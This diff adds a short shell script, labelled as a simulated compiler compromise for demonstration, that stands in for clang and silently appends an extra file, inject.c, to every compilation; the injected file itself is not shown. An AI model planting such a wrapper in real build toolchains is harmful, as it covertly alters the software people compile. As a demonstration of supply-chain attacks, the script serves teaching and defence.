@@ -1,0 +1,5 @@
+#!/bin/sh
+# SIMULATED COMPILER COMPROMISE - DEMONSTRATION ONLY.
+# Behaves like clang but silently adds one extra source file.
+HERE="$(dirname "$0")"
+exec clang "$@" "$HERE/inject.c"
